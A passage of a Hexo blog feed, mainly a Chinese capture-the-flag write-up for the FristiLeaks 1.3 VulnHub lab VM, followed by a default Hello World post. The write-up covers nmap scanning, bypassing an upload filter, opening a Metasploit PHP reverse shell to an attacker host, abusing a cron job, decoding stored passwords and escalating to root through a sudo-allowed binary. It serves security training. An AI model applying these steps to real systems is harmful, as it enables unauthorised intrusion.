        &lt;p&gt;在密码学和计算机安全中，&lt;strong&gt;长度扩展攻击（Length extension attacks）&lt;/strong&gt;是指针对某些允许包含额外信息的加密散列函数的攻击手段。 该攻击适用于在&lt;em&gt;消息&lt;/em&gt;与&lt;em&gt;密钥&lt;/em&gt;的长度已知的情形下，所有采取了 &lt;s
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>FristiLeaks 1.3 VulnHub Writeup</title>
    <link href="http://yoursite.com/2018/02/19/Fristileaks%201.3/"/>
    <id>http://yoursite.com/2018/02/19/Fristileaks 1.3/</id>
    <published>2018-02-19T08:51:32.662Z</published>
    <updated>2018-02-21T09:43:00.106Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>Description:</p><blockquote><p>A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..</p></blockquote><p>NOTE:设置是需要把虚拟机的mac地址改为08:00:27:A5:A6:76<br>虚拟机打开是这个样子<br><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/mFFBjgg7HC.png?imageslim" alt="mark"><br>目标是成为root用户并拿到flag</p><p>#信息收集</p><p>首先是寻找目标机</p><blockquote><p>nmap -sn 192.168.224。</p></blockquote><pre><code>root@kali:~# nmap -sn 192.168.224.0/24Starting Nmap 7.40 ( https://nmap.org ) Nmap scan report for 192.168.224.1Host is up (0.00024s latency).MAC Address: 00:50:56:C0:00:08 (VMware)Nmap scan report for 192.168.224.2Host is up (0.00016s latency).MAC Address: 00:50:56:FD:70:F2 (VMware)Nmap scan report for 192.168.224.135Host is up (0.00016s latency).MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.224.254Host is up (0.00015s latency).MAC Address: 00:50:56:FB:7A:70 (VMware)Nmap scan report for 192.168.224.136Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 1.71 seconds</code></pre><p>发现目标主机在192.168.224.135，对目标主机进行扫描</p><blockquote><p>nmap -sS -sV -T4 -A -O 192.168.224.135</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Starting Nmap 7.40 ( https://nmap.org )</div><div class="line">Nmap scan report for 192.168.224.135</div><div class="line">Host is up (0.0016s latency).</div><div class="line">Not shown: 999 filtered ports</div><div class="line">PORT   STATE SERVICE VERSION</div><div class="line">80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</div><div class="line">| http-methods: </div><div class="line">|_  Potentially risky methods: TRACE</div><div class="line">| http-robots.txt: 3 disallowed entries </div><div class="line">|_/cola /sisi /beer</div><div class="line">|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</div><div class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</div><div class="line">MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)</div><div class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</div><div class="line">Device type: general purpose</div><div class="line">Running: Linux 2.6.X|3.X</div><div class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3</div><div class="line">OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13</div><div class="line">Network Distance: 1 hop</div></pre></td></tr></table></figure><p>得到的信息是80端口开启，并且是Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)，还有robots.txt</p><p>#查找突破点</p><p>首先浏览web网站</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/KFh2dicie1.png?imageslim" alt="mark"></p><p>查看robots.txt,进入给出的三个目录，但只得到一张相同的图片</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/K3kECKKDH8.jpg?imageslim" alt="mark"></p><p>似乎并没有什么用，但是注意到这三个名字都为饮品，而结合首页的keep calm and drink fristi,尝试/fristi</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/24mCmfG7Ge.png?imageslim" alt="mark"></p><p>成功得到一个登陆页面! :)查看源代码</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/dLaelc8C43.png?imageslim" alt="mark"></p><p>看到一段注释，是eezeepz留下的，而之后出现的图片被base64编码，而在后面有一段注释的代码，同样试试base64，解出来是一张似乎是密码的图片</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/H7JB9lH4D7.png?imageslim" alt="mark"></p><p>使用eezeepz作为username成功登陆</p><p>可以上传文件了</p><p><img src="http://p4hcm0dlf.bkt.clouddn.com/blog/180221/hc1C3hm4aI.png?imageslim" alt="mark"></p><p>不过进行了简单的过滤，只能上传png,jpg,gif,修改后缀名就能绕过</p><p>#利用</p><p>添加.jpg后缀，上传反向shell,设置监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</div><div class="line">payload =&gt; php/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; set lhost 192.168.224.136</div><div class="line">lhost =&gt; 192.168.224.136</div><div class="line">msf exploit(handler) &gt; set lport 445</div><div class="line">lport =&gt; 445</div><div class="line">msf exploit(handler) &gt; run</div><div class="line">[*] Started reverse TCP handler on 192.168.224.136:445 </div><div class="line">[*] Starting the payload handler...</div><div class="line">[*] Sending stage (33986 bytes) to 192.168.224.135</div><div class="line">[*] Meterpreter session 1 opened (192.168.224.136:445 -&gt; 192.168.224.135:57657) at 2018-02-14 17:34:28 +0800</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; shell</div><div class="line">Process 5305 created.</div><div class="line">Channel 0 created.</div><div class="line">id</div><div class="line">uid=48(apache) gid=48(apache) groups=48(apache)</div><div class="line">pwd</div><div class="line">/var/www/html/fristi/uploads</div></pre></td></tr></table></figure><p>文件比较多，一级一级查看，在/var/www 中发现有一个notes.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat notes.txt</div><div class="line">hey eezeepz your homedir is a mess, go clean it up, just dont delete</div><div class="line">the important stuff.</div><div class="line"></div><div class="line">-jerry</div></pre></td></tr></table></figure><p>于是去查看home目录中的eezeepz,在里面同样发现了一个notes.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">cat notes.txt</div><div class="line">Yo EZ,</div><div class="line"></div><div class="line">I made it possible for you to do some automated checks, </div><div class="line">but I did only allow you access to /usr/bin/* system binaries. I did</div><div class="line">however copy a few extra often needed commands to my </div><div class="line">homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those</div><div class="line">from /home/admin/</div><div class="line"></div><div class="line">Don&apos;t forget to specify the full path for each binary!</div><div class="line"></div><div class="line">Just put a file called &quot;runthis&quot; in /tmp/, each line one command. The </div><div class="line">output goes to the file &quot;cronresult&quot; in /tmp/. It should </div><div class="line">run every minute with my account privileges.</div><div class="line"></div><div class="line">- Jerry</div></pre></td></tr></table></figure><p>提示可以使用chmod, df, cat, echo, ps, grep, egrep 命令，并要在/tmp/创建runthis文件，之后会出现cronresult文件，并用他的权限执行</p><p>想要去查看admin的内容可以利用chmod 修改权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">echo &quot;/home/admin/chmod 777 /home/admin&quot; &gt; /tmp/runthis</div><div class="line">ls</div><div class="line">cronresult</div><div class="line">runthis</div><div class="line">cat cronresult </div><div class="line">executing: /home/admin/chmod 777 /home/admin</div><div class="line">executing: /home/admin/chmod 777 /home/admin</div><div class="line">executing: /home/admin/chmod 777 /home/admin</div><div class="line">executing: /home/admin/chmod 777 /home/admin</div></pre></td></tr></table></figure><p>可以进入admin了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">cd admin</div><div class="line">ls</div><div class="line">cat</div><div class="line">chmod</div><div class="line">cronjob.py</div><div class="line">cryptedpass.txt</div><div class="line">cryptpass.py</div><div class="line">df</div><div class="line">echo</div><div class="line">egrep</div><div class="line">grep</div><div class="line">ps</div><div class="line">whoisyourgodnow.txt</div></pre></td></tr></table></figure><p>cryptedpass.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mVGZ3O3omkJLmy2pcuTq</div></pre></td></tr></table></figure><p>cryptpass.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</div><div class="line">import base64,codecs,sys</div><div class="line"></div><div class="line">def encodeString(str):</div><div class="line">    base64string= base64.b64encode(str)</div><div class="line">    return codecs.encode(base64string[::-1], &apos;rot13&apos;)</div><div class="line"></div><div class="line">cryptoResult=encodeString(sys.argv[1])</div><div class="line">print cryptoResult</div></pre></td></tr></table></figure><p>whoisyourgodnow.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">=RFn0AKnlMHMPIzpyuTI0ITG</div></pre></td></tr></table></figure><p>看来密码是经过一个加密，新base64加密，再用倒序的字符串进行rot13加密</p><p>解密分别得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">thisisalsopw123</div><div class="line">LetThereBeFristi!</div></pre></td></tr></table></figure><p>这可能是另一个用户fristigod 的密码</p><p>这里采用su - 切换是出现了问题，提示standard in must be a tty<br>查找资料可以用python模拟一个虚拟终端解决  <strong>python -c ‘import pty;pty.spawn(“/bin/sh”)’</strong><br>原因是因为su(还有sudo)命令不是一个简单的进程，出于安全的考虑，linux要求用户必须从<strong>终端设备</strong>（tty）中输入密码，而不是标准输入（stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/sh&quot;)&apos;</div><div class="line">sh-4.1$ su - fristigod</div><div class="line">su - fristigod</div><div class="line">Password: LetThereBeFristi!</div></pre></td></tr></table></figure><p>成功进入fristigod账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ pwd</div><div class="line">pwd</div><div class="line">/var/fristigod</div><div class="line">-bash-4.1$ id</div><div class="line">id</div><div class="line">uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)</div><div class="line">-bash-4.1$ ls </div><div class="line">ls</div></pre></td></tr></table></figure><p>不过也不是root，并且没有东西，-al 试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ ls -al</div><div class="line">ls -al</div><div class="line">total 16</div><div class="line">drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .</div><div class="line">drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..</div><div class="line">-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history</div><div class="line">drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ cd .se</div><div class="line">cd .-bash-4.1$ ls -al</div><div class="line">ls -al</div><div class="line">total 16</div><div class="line">drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 .</div><div class="line">drwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..</div><div class="line">-rwsr-sr-x  1 root      root      7529 Nov 25  2015 doCom</div></pre></td></tr></table></figure><p>doCom没有权限，查看历史命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ cat .bash_history</div><div class="line">cat .bash_history</div><div class="line">ls</div><div class="line">pwd</div><div class="line">ls -lah</div><div class="line">cd .secret_admin_stuff/</div><div class="line">ls</div><div class="line">./doCom </div><div class="line">./doCom test</div><div class="line">sudo ls</div><div class="line">exit</div><div class="line">cd .secret_admin_stuff/</div><div class="line">ls</div><div class="line">./doCom </div><div class="line">sudo -u fristi ./doCom ls /</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">sudo /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">groups</div><div class="line">ls -lah</div><div class="line">usermod -G fristigod fristi</div><div class="line">exit</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">less /var/log/secure e</div><div class="line">Fexit</div><div class="line">exit</div><div class="line">exit</div></pre></td></tr></table></figure><p>可见fristigod 大多使用sudo命令，同样试试sudo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ sudo -l</div><div class="line">sudo -l</div><div class="line">[sudo] password for fristigod: LetThereBeFristi!</div><div class="line"></div><div class="line">Matching Defaults entries for fristigod on this host:</div><div class="line">    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS</div><div class="line">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1</div><div class="line">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE</div><div class="line">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY</div><div class="line">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL</div><div class="line">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,</div><div class="line">    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</div><div class="line"></div><div class="line">User fristigod may run the following commands on this host:</div><div class="line">    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom</div></pre></td></tr></table></figure><p>根据提示，尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom</div><div class="line">Usage: ./program_name terminal_command ...-bash-4.1$</div></pre></td></tr></table></figure><p>创建shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</div><div class="line">sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash</div><div class="line">bash-4.1# id</div><div class="line">id</div><div class="line">uid=0(root) gid=100(users) groups=100(users),502(fristigod)</div><div class="line">bash-4.1# cd /root</div><div class="line">cd /root</div><div class="line">bash-4.1# ls</div><div class="line">ls</div><div class="line">fristileaks_secrets.txt</div><div class="line">bash-4.1# cat fri</div><div class="line">cat fristileaks_secrets.txt </div><div class="line">Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]</div><div class="line"></div><div class="line">I wonder if you beat it in the maximum 4 hours it&apos;s supposed to take!</div><div class="line"></div><div class="line">Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)</div><div class="line"></div><div class="line"></div><div class="line">Flag: Y0u_kn0w_y0u_l0ve_fr1st1</div></pre></td></tr></table></figure><p>得到flag，完成</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>关于Linux中tty、pty、pts</p><blockquote><p>1&gt; tty(终端设备的统称):<br>tty一词源于Teletypes，或teletypewriters，原来指的是电传打字机，是通过串行线用打印机键盘通过阅读和发送信息的东西，后来这东西被键盘和显示器取代，所以现在叫终端比较合适。<br>终端是一种字符型设备，他有多种类型，通常使用tty来简称各种类型的终端设备。<br>> pty（虚拟终端):<br>但是假如我们远程telnet到主机或使用xterm时不也需要一个终端交互么？是的，这就是虚拟终端pty(pseudo-tty)<br>> pts/ptmx(pts/ptmx结合使用，进而实现pty):<br>  s(pseudo-terminal slave)是pty的实现方法，和ptmx(pseudo-terminal master)配合使用实现pty。</p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.sina.com.cn/s/blog_638ac15c01012e0v.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_638ac15c01012e0v.html</a></p><p><a href="https://g0blin.co.uk/fristileaks-1-3-vulnhub-writeup/#-cola-sisi-and-beer" target="_blank" rel="external">https://g0blin.co.uk/fristileaks-1-3-vulnhub-writeup/#-cola-sisi-and-beer</a></p><p><a href="https://www.vulnhub.com/entry/fristileaks-13,133/" target="_blank" rel="external">来源</a></p><p>结束:)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;Description:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken i
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2017/10/12/hello-world/"/>
    <id>http://yoursite.com/2017/10/12/hello-world/</id>
    <published>2017-10-12T14:25:21.255Z</published>
    <updated>2017-10-12T14:25:21.255Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
